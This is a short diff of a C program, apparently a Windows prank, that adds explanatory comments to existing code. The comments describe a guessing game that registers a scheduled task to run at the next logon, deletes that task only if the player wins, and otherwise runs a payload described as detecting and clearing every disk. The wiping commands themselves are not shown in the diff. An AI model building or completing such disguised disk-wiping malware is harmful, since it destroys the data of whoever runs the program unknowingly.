@@ -4,6 +4,7 @@
 #include <time.h>
 #include <stdlib.h>
 
+// schedules the task for next user logon
 void task_sch() {
     char exepath[MAX_PATH]; //finding current executable
     char cmd[MAX_PATH + 256]; // buffer for the rest of the code
@@ -17,6 +18,7 @@ void task_sch() {
     system(cmd);
     
 }
+// random numer 1-10 guessing game
 void game() {
     SetConsoleTitleA("Screen");
 
@@ -44,9 +46,11 @@ void game() {
             printf("Wrong :(");
         }
 }}
+// so if you win your system isnt destroyed
 void safe() {
     system("schtasks /delete /tn \"game\" /f");
 }
+// detects every disk and clears them 
 void payload() {
     // sorry the commands are gonna be hard ot decipher
     
@@ -64,6 +68,7 @@ void payload() {
     );
 }
 int main(int argc, char *argv[]){
+    // so that on logon, the script only runs the payload
     if (argc > 1 && strcmp(argv[1], "payload") == 0) {
         payload();
         return 0;
